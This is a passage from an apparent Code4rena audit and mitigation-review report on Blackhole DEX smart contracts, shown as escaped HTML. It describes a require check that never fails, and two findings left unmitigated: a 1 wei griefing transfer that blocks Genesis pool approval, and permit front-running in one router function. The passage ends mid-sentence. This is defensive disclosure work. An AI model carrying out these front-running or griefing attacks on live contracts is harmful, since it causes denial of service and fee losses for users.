class=\"mtk12\"\u003e_int\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt;= \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//@audit incorrect require statement\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_int\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe purpose of the \u003ccode\u003erequire\u003c/code\u003e statement is to prevent setting an invalid address, particularly the zero address, which would disable fee forwarding. However, the current implementation does allow this.\u003c/p\u003e\n\u003ch3 id=\"impact-23\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-23\" aria-label=\"impact 23 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eIneffective validation: The condition \u003ccode\u003erequire(_int \u003e= address(0), \"ZA\");\u003c/code\u003e is always true in Solidity because addresses are unsigned integers and cannot be less than zero.\u003c/li\u003e\n\u003cli\u003eZero address allowed: This means the zero address (\u003ccode\u003eaddress(0)\u003c/code\u003e) can be assigned unintentionally, potentially redirecting fees to the zero address and causing permanent loss of funds.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-35\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-35\" aria-label=\"recommended mitigation steps 35 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eCorrected Code:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"93\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003esetInternalBribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_int\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyOwner\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_int\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;ZA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Corrected Version\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einternal_bribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_int\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003chr\u003e\n\u003ch1 id=\"mitigation-review\" style=\"position:relative;\"\u003e\u003ca href=\"#mitigation-review\" aria-label=\"mitigation review permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"#mitigation-review\"\u003eMitigation Review\u003c/a\u003e\u003c/h1\u003e\n\u003ch2 id=\"introduction\" style=\"position:relative;\"\u003e\u003ca href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eFollowing the C4 audit, 3 wardens (\u003ca href=\"https://code4rena.com/@rayss\"\u003erayss\u003c/a\u003e, \u003ca href=\"https://code4rena.com/@lonelybones\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/@maxzuvex\"\u003emaxzuvex\u003c/a\u003e) reviewed the mitigations for all identified issues. Additional details can be found within the \u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation\"\u003eC4 Blackhole Mitigation Review repository\u003c/a\u003e.\u003c/p\u003e\n\u003ch2 id=\"mitigation-review-scope--summary\" style=\"position:relative;\"\u003e\u003ca href=\"#mitigation-review-scope--summary\" aria-label=\"mitigation review scope  summary permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eMitigation Review Scope \u0026#x26; Summary\u003c/h2\u003e\n\u003cp\u003eDuring the mitigation review, the wardens determined that 2 in-scope findings from the original audit were not fully mitigated. The table below provides details regarding the status of each in-scope vulnerability from the original audit, followed by full details on the in-scope vulnerabilities that were not fully mitigated.\u003c/p\u003e\n\u003ctable\u003e\n\u003cthead\u003e\n\u003ctr\u003e\n\u003cth align=\"center\"\u003eOriginal Issue\u003c/th\u003e\n\u003cth\u003eStatus\u003c/th\u003e\n\u003c/tr\u003e\n\u003c/thead\u003e\n\u003ctbody\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-245\"\u003eH-01\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-176\"\u003eH-02\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-17\"\u003eM-01\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-184\"\u003eM-02\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-175\"\u003eM-03\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-114\"\u003eM-04\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-122\"\u003eM-05\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🔴 Unmitigated\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-187\"\u003eM-06\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-279\"\u003eM-07\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-324\"\u003eM-08\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-409\"\u003eM-09\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-410\"\u003eM-10\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🔴 Unmitigated\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-74\"\u003eM-11\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-236\"\u003eM-14\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-33\"\u003eM-15\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-406\"\u003eM-16\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-412\"\u003eM-17\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-416\"\u003eM-18\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-419\"\u003eM-19\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-423\"\u003eM-20\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-82\"\u003eM-21\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-220\"\u003eADD-01\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003ctr\u003e\n\u003ctd align=\"center\"\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-83\"\u003eADD-02\u003c/a\u003e\u003c/td\u003e\n\u003ctd\u003e🟢 Mitigation Confirmed\u003c/td\u003e\n\u003c/tr\u003e\n\u003c/tbody\u003e\n\u003c/table\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-05-unmitigated\" style=\"position:relative;\"\u003e\u003ca href=\"#m-05-unmitigated\" aria-label=\"m 05 unmitigated permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-40\"\u003e[M-05] Unmitigated\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-40\"\u003erayss\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-17\"\u003elonelybones\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-57\"\u003emaxvzuvex\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/BlackHoleDEX/SmartContracts/blob/7b5c04a9b91a4f11063f4d403b97f5ec97a21600/contracts/GenesisPoolManager.sol#L174\"\u003ehttps://github.com/BlackHoleDEX/SmartContracts/blob/7b5c04a9b91a4f11063f4d403b97f5ec97a21600/contracts/GenesisPoolManager.sol#L174\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-24\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-24\" aria-label=\"finding description 24 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe S-122 issue’s duplicate S-348 highlights that in the GenesisPool approval process an insecure balance check used during \u003ccode\u003eapproveGenesisPool\u003c/code\u003e. After a whitelisted user calls \u003ccode\u003edepositNativeToken\u003c/code\u003e to initialize a GenesisPool, anyone observing this data can preemptively create the same pair via PairFactory and send a minimal amount (even 1 wei) of the fund\u003ccode\u003eingToken directly to the pair contract. When governance later attempts to approve the pool, the function checks that both the\u003c/code\u003enativeToken\u003ccode\u003eand\u003c/code\u003efundingToken\u003ccode\u003ebalances at the pair address are zero. If either balance is non-zero—due to direct token transfers—the approval fails with a\u003c/code\u003e!ZV` revert. This allows malicious actors to grief or brick the approval process at negligible cost.\u003c/p\u003e\n\u003cp\u003eThe new mitigation in the \u003ccode\u003edepositNativeToken\u003c/code\u003e and \u003ccode\u003eapproveGenesisPool\u003c/code\u003e:\u003c/p\u003e\n\u003cp\u003eIn the \u003ccode\u003edepositNativeToken\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"94\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            if (pairAddress == address(0)) {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            pairAddress = pairFactory.createPair(nativeToken, _fundingToken, _stable);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        } else {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            require(IERC20(nativeToken).balanceOf(pairAddress) == 0, \u0026quot;!ZV\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e            require(IERC20(_fundingToken).balanceOf(pairAddress) == 0, \u0026quot;!ZV\u0026quot;);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        }\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        pairFactory.setGenesisStatus(pairAddress, true);\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn the \u003ccode\u003eapproveGenesisPool\u003c/code\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"95\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    require(IERC20(nativeToken).balanceOf(pairAddress) == 0, \u0026quot;!ZV\u0026quot;);Add commentMore actions\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(IERC20(genesisInfo.fundingToken).balanceOf(pairAddress) == 0, \u0026quot;!ZV\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe issue remains unmitigated even for this (but in a different attack path than the review I stated for S-122). Let’s understand this via a example:\u003c/p\u003e\n\u003cp\u003eUser calls the \u003ccode\u003edepositNativeToken\u003c/code\u003e. The pair address is not created so it enters the if block and calls \u003ccode\u003ecreatePair()\u003c/code\u003e function.\u003c/p\u003e\n\u003cp\u003eNow after this step, the attacker views the transactions in the mempool via a coreth node and sees that a pair has been created, he quickly sends 1 wei to the \u003ccode\u003epairAddress\u003c/code\u003e before the \u003ccode\u003eapproveGenesisPool()\u003c/code\u003e function is called.\u003c/p\u003e\n\u003cp\u003eNow when the \u003ccode\u003eapproveGenesisPool()\u003c/code\u003e is called it has this check:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"96\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  require(IERC20(nativeToken).balanceOf(pairAddress) == 0, \u0026quot;!ZV\u0026quot;);Add commentMore actions\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e        require(IERC20(genesisInfo.fundingToken).balanceOf(pairAddress) == 0, \u0026quot;!ZV\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eWhich will revert. Leading to the Dos of the \u003ccode\u003eapproveGenesisPool\u003c/code\u003e. Hence, leading to the issue to be remained unmitigated.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-10-unmitigated\" style=\"position:relative;\"\u003e\u003ca href=\"#m-10-unmitigated\" aria-label=\"m 10 unmitigated permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-34\"\u003e[M-10] Unmitigated\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-34\"\u003erayss\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-11\"\u003elonelybones\u003c/a\u003e.\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/BlackHoleDEX/SmartContracts/blob/7b5c04a9b91a4f11063f4d403b97f5ec97a21600/contracts/RouterV2.sol#L726\"\u003ehttps://github.com/BlackHoleDEX/SmartContracts/blob/7b5c04a9b91a4f11063f4d403b97f5ec97a21600/contracts/RouterV2.sol#L726\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-25\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-25\" aria-label=\"finding description 25 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThis issue demonstrates that in the \u003ccode\u003eremoveLiquidityWithPermit()\u003c/code\u003e and \u003ccode\u003eremoveLiquidityETHWithPermit()\u003c/code\u003e functions in RouterV2, which unconditionally call \u003ccode\u003epermit()\u003c/code\u003e without proper error handling. This allows an attacker to front-run the permit signature (extracted from the \u003ccode\u003emempool\u003c/code\u003e), causing the original transaction to revert and resulting in gas fee loss for the user.\u003c/p\u003e\n\u003cp\u003eThe new mitigation correctly uses the try and catch method to rectify the issue in the \u003ccode\u003eremoveLiquidityWithPermit()\u003c/code\u003e and \u003ccode\u003eremoveLiquidityETHWithPermit()\u003c/code\u003e functions.\u003c/p\u003e\n\u003cp\u003eHowever, this issue still remains unmitigated because the \u003ccode\u003eremoveLiquidityETHWithPermitSupportingFeeOnTransferTokens()\u003c/code\u003e function is not guarded with this logic. It continues to make a direct, unprotected call to \u003ccode\u003epermit()\u003c/code\u003e. As a result, the issue remains unmitigated, since the vulnerability is still exploitable via the \u003ccode\u003eremoveLiquidityETHWithPermitSupportingFeeOnTransferTokens()\u003c/code\u003e function, allowing attackers to front-run and 